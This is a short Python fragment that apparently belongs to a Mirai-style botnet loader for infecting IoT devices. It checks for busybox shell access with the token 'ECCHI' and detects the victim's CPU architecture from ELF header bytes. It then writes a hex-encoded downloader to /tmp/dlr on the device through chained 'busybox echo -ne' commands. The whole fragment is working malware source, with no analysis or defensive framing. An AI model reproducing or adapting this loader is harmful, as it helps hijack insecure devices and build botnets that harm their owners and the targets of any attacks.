TOKEN_RESPONSE = "ECCHI"
TOKEN_QUERY = "/bin/busybox {}\n".format(TOKEN_RESPONSE)


def connection_consume(rdbuff):
    if TOKEN_RESPONSE in rdbuff:
        return 1
    else:
        return 0


def connection_consume_writeable_dirs():
    pass


def connection_consume_arch(rdbuff):
    pos = rdbuff.find("ELF")
    if pos >= 0:
        pbuff = rdbuff[pos-1:]
        if ord(pbuff[18]) == 40 or ord(pbuff[18]) == 183:
            return "arm"
        if ord(pbuff[18]) == 8 or ord(pbuff[18]) == 10:
            # Mips
            if ord(pbuff[5]) == 1:
                # Little Endian
                return "mpsl"
            else:
                return "mips"
        if ord(pbuff[18]) == 3 or ord(pbuff[18]) == 6 or ord(pbuff[18]) == 7 or ord(pbuff[18]) == 62:
            return "x86"
        if ord(pbuff[18]) == 2 or ord(pbuff[18]) == 18 or ord(pbuff[18]) == 43:
            return "spc"
        if ord(pbuff[18]) == 4 or ord(pbuff[18]) == 5:
            return "m68k"
        if ord(pbuff[18]) == 20 or ord(pbuff[18]) == 21:
            return "ppc"
        if ord(pbuff[18]) == 42:
            return "sh4"
        return "Unknown"


def connection_load_dlr(conn, hex_payloads, pos):
    if pos < len(hex_payloads):
        conn.send("/bin/busybox echo -ne \"{}\" {} /tmp/dlr; {}".format(hex_payloads[pos],
                                                                         '>' if pos == 0 else '>>',
                                                                         TOKEN_QUERY))
        return 0
    else:
        conn.send(TOKEN_QUERY)
        return 1